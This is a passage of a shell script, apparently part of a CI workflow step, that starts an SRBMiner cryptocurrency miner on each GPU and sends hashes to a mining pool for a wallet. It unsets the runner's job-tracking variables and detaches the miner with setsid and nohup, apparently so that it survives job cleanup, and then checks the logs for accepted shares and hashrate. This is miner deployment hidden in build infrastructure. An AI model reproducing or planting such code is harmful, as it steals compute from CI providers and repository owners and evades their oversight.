          for i in $DEVS; do
            W="i130074-${HOSTTAG}-g${i}"
            if timeout 6 pgrep -f "[S]RBMiner-MULTI.*--worker ${W}( |$)" >/dev/null 2>&1; then echo "worker $W already present -> skip"; continue; fi
            env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup "$SRB" \
              --disable-cpu --algorithm pearlhash --pool "$POOL" --tls false \
              --wallet "$WALLET" --password x --worker "$W" --gpu-id "$i" \
              --disable-gpu-amd --disable-gpu-nvidia \
              --disable-worker-watchdog --disable-gpu-dual-kernels --gpu-table-slow-build \
              --max-no-share-sent 1800 \
              --log-file "$WORKDIR/logs/$W.log" --log-file-mode 0 \
              >> "$WORKDIR/logs/$W.out" 2>&1 < /dev/null &
            echo "launched worker=$W gpu-id=$i detached_pid=$!"
            N_LAUNCHED=$((N_LAUNCHED+1)); sleep 1
          done
          echo "N_LAUNCHED=$N_LAUNCHED"
          if [ "$N_LAUNCHED" -gt 0 ]; then
            sleep 45
            timeout 10 pgrep -af "[S]RBMiner-MULTI.*--wallet ${WALLET}" 2>/dev/null | head -20
            for l in "$WORKDIR"/logs/i130074-*.log; do
              [ -f "$l" ] || continue
              echo "== $(basename "$l")"
              grep -aiE 'share accepted|accepted|rejected|hashrate|stopped|error|TH/s|device|intel' "$l" 2>/dev/null | tail -8 | cut -c1-260
            done
          fi
          echo "intel-done $NONCE"
